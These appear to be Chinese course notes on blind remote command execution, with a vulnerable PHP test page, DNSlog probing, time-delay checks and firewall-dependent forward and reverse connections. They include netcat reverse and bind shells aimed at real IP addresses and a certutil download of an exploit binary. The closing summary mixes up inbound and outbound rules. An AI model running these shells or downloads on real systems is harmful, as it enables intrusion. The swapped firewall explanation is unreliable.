---
title: 数据不回显&数据不出网&出入站策略&正反向连接&反弹Shell&外带延迟写入
published: 2026-01-21 18:00:00
description: 数据不回显：可以利用反弹权限、数据外带、延迟、和写入文件查看文件是否能访问搭配来判断是不是存在漏洞。数据不出网：需要判断出入站策略。入站被拦就反向，出站被拦就正向。以及双向都拦截，这时候就需要上ICMP/DNS隧道或正反向混合。
tags: [基础入门,反弹Shell,数据外带,出入站策略]
category: 网络安全
draft: false
---

# 知识点

1. [数据不回显原因和解决-带外延迟反弹写文件](#数据不回显-原因解决-反弹&带外&延迟&写文件)
2. [数据不出网原因和解决-出入站策略正反向连接](#数据不出网-原因解决-正反连接&出入站策略&隧道)

## 数据不回显-原因解决-反弹&带外&延迟&写文件

**实战过程：**

1. 判断是不是数据不回显并且有漏洞？
2. 有这个漏洞如何把执行的数据到呢？

**解决：**

1. 反弹权限

   **判定目标的操作系统**

   https://forum.ywhack.com/shell.php

   https://cloud.tencent.com/developer/article/1906240

   ```bash
   nc -e cmd 119.45.254.149 7777
   //让目标机器把自身的cmd转发到攻击机的7777端口
   ```

   ```bash
   nc -lvp 7777
   //在攻击机对目标进行监听
   ```

2. 数据带外

   DNSlog

   TCP-Portlog

   ICMP-Sizelog

3. 延迟判断

   发包看回显时间

   Win：ping -n 3 127.0.0.1

   Linux：ping -c 3 127.0.0.1

4. 写访问文件

   写静态文件或写入可访问的文件确定

5. 其他：根据环境

   文件下载等（反链的意义）

### 演示案例0-数据回显问题

**原因：代码层面函数调用问题，没有输出测试等。**

代码如下，可以看到是有数据回显的：

```php
<?php
//shell_exec($_GET['c']);
system($_GET['c'])
?>
```

![image-20260121110519331](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121110519331.png)

注释掉 system，打开shell_exec：

```php
<?php
shell_exec($_GET['c']);
//system($_GET['c'])
?>
```

![image-20260121110705335](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121110705335.png)

再进行echo输出一下，看看显示如何：

```php
<?php
echo shell_exec($_GET['c']);
//system($_GET['c'])
?>
```

![image-20260121110740537](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121110740537.png)

### 演示案例1-数据带外

#### DNSLOG

可以使用Yakit，也可以使用一些在线平台，比如：http://ceye.io/

这里就使用Yakit来进行演示了。

![image-20260121163722727](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121163722727.png)

在URL中拼接：ip/rce.php?c=ping ffghfuidmb.yutu.eu.org

远端IP，是以DNS服务器的解析为主，与实际ip不同是正常的情况。

![image-20260121163834969](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121163834969.png)

#### ICMP-Portlog

同样也是在url中拼接。

![image-20260121163930658](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121163930658.png)

#### TCP-Sizelog

##### linux

![image-20260121164321364](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121164321364.png)

![image-20260121164332228](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121164332228.png)

##### Windows

这里只是演示数据外带，所以如何把nc.exe放到目标机，需要听后期课程。

![image-20260121164533479](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121164533479.png)

![image-20260121164607579](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121164607579.png)

### 演示案例2-延迟判断

发包看回显时间

```bash
Win：ping -n 6 127.0.0.1
Linux：ping -c 6 127.0.0.1
//不止ping命令可以，还有其他的
```

![image-20260121165023235](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121165023235.png)

![image-20260121165238855](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121165238855.png)

### 演示案例3-写访问文件

写静态文件或写入可访问的文件确定。

```bash
xxx/rce.php?c=echo 123 > 1.txt
```

![image-20260121165552598](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121165552598.png)

![image-20260121165600990](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121165600990.png)

### 演示案例4-其他：根据环境

文件下载、ping、curl等。

![image-20260121165719053](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121165719053.png)

这个只是用来生成命令，需要修改ip和端口（自己的服务器，目的是为了看看对方有没有执行过命令等），此处因为没有云服务器就没有修改。

![image-20260121165950461](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121165950461.png)

命令：

```bash
certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe
```

![image-20260121170009453](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121170009453.png)

![image-20260121172551697](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121172551697.png)

![image-20260121172606962](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121172606962.png)

### 演示案例5-反弹权限(*重要标识)

棱角社区在线生成反弹shell命令：https://forum.ywhack.com/shell.php

反弹shell的技巧总结（主要是目标机的系统）：https://cloud.tencent.com/developer/article/1906240

![image-20260121171455261](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121171455261.png)

```bash
nc -e cmd 119.45.254.149 7777 //目标机器把自身的cmd转发到119.45.254.149 7777端口上
```

![image-20260121171536327](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121171536327.png)

```bash
nc -lvp 7777 //119.45.254.149服务器监听本地7777端口即可获取目标机器的shell
//之后在攻击机处，也就是我们Linux处对目标机器进行监听，就可以把目标的cmd反弹回来
```

![image-20260121171619058](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121171619058.png)

## 数据不出网-原因解决-正反连接&出入站策略&隧道

### 解释

假如说现在一台服务器A的入站规则如下：

```
//服务器A的入站规则
0.0.0.0/0
TCP:20,21,22,3389,80,443

//所有来源的主机（不限制ip），访问TCP协议的这些开放的端口不受限制。
//就比如说
//主机B对该服务器A进行远程连接（3389端口），此时是可以正常连接的，但是当服务器A在入站规则中关闭该端口时，就无法进行连接。
```

流程：

环境：Windows外网靶机，Linux外网攻击机

![image-20260121174246357](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121174246357.png)

1. 判断出入限制

   ![image-20260121174318210](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121174318210.png)

   ![image-20260121174328942](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121174328942.png)

2. 判断出入限制的端口和协议

   **原因：主机或应用防火墙出站限制**

   ![image-20260121174359716](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121174359716.png)

3. 分析原因用正向还是反向还是隧道

**解决：Windows利用NC反弹实验**

1. 正向连接
2. 反向连接
3. 隧道技术

实验：相对于靶机角度

1. 开启入站策略，采用反向连接

   反向连接：主动给出去，对方监听

   ```bash
   //绑定CMD到目标IP的6666端口
   nc -e cmd 146.56.193.187 6666
   ```
   
   ```bash
   //等待6666连接
   nc -lvvp 6666
   ```
   
2. 开启出站策略，采用正向连接

   正向连接：本地监听等待对方连接

   ```bash
   //绑定CMD到本地6666端口
   nc -e cmd -lvvp 6666
   ```
   
   ```bash
   //主动连接目标6666
   nc 43.134.218.194 6666
   ```
   
3. 开启出站策略，采用其他协议隧道

   ICMP,DNS等隧道技术

### 演示案例6-反向连接

开启入站策略，采用反向连接

反向连接：主动给出去，对方监听

1. 靶机绑定CMD到攻击机的1111端口（此处千万不要疑问，实际上不是主动给出CMD的，是攻击者利用某种手段令靶机给出）

   ```bash
   nc -e cmd 119.45.254.149 1111
   //因为Windows也就是靶机的出站规则是所有都放行，所以这里是靶机把1111给出去
   ```

2. 攻击机等待1111连接

   ```bash
   nc -lvvp 1111
   ```

   ![image-20260121180230194](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121180230194.png)

### 演示案例7-正向连接

开启出站策略，采用正向连接

正向连接：本地监听等待对方连接

![image-20260121175954547](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121175954547.png)

![image-20260121180015107](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121180015107.png)

1. 靶机绑定CMD到本地21端口（此处只要是没被占用的端口都可以）

   ```bash
   nc -e cmd -lvvp 21
   ```

   ![image-20260121180106895](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121180106895.png)

2. 攻击机主动连接靶机的21端口

   ```bash
   nc 118.195.140.161 21
   ```

   ![image-20260121180143330](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121180143330.png)

### 演示案例8-隧道技术了解

![image-20260121181253798](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121181253798.png)

## 关于出入站策略个人理解

其实就是说，

如果当靶机的入站策略限制时，靶机出不来，只能让靶机主动连接攻击机，攻击机对目标进行监听（反向）。

如果当靶机的出站策略限制时，靶机进不去，只能让靶机开放端口等待攻击机，于是攻击机主动去连接靶机（正向）。

### 拓展思考

Windows内网靶机或Linux内网攻击机呢？

如果都是内网的话，只能是内网主机出去找其他外网主机（攻击机），所以正向连接是受影响的。

## 总结

由上述内容发现还需那些内容学习：

1. 其他反弹项目使用 工具或自带命令
2. 系统操作命令使用 文件下载
3. 复杂内网通讯隧道
